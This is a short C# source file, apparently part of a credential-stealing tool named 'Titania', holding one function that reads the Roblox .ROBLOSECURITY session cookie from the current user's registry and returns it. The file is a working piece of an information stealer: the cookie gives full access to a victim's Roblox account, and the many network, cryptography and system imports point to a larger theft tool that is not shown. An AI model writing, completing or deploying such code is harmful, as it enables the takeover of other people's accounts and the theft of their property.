using System.Threading.Tasks;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;


namespace Titania.Logging
{
  
    internal class Misc
    {

        public static string RobloxCookies()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
                {
                    if (key == null)
                    return null;
                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    return cookie.Substring(46).Trim('>');
                }
            }
            catch
            { return null; }

        }

      
    }
}

